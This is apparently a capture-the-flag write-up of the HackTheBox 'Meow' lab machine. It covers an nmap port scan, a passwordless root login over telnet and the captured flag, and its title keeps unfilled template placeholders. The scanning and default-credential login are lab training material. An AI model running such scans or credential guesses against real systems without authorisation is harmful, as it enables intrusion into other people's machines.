# [HackTheBox] [Meow]: [Vector 1], [Vector 2] & [PrivEsc]

**Target:** [Meow] | **OS:** Linux **Difficulty:** Super Easy  
**Attack Vector:** [Enumeration]

---

## 1. Enumeration

We begin by doing a quick Enumeration

```bash
sudo nmap -p- -sS ---min-rate 5000 -T3 10.129.118.204
```

PORT   STATE SERVICE
23/tcp open  telnet

We got the port 23 open; Telnet, lets try logging in with the default credentials.

![Search](/home/yoel/writeups/htb/meow/assets/search.png)

Here i tried these three and did the following:

```bash
telnet 10.129.118.204 
```

Then when i tried `root` it allowed me to connect, once inside

```bash
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```

Pwned.
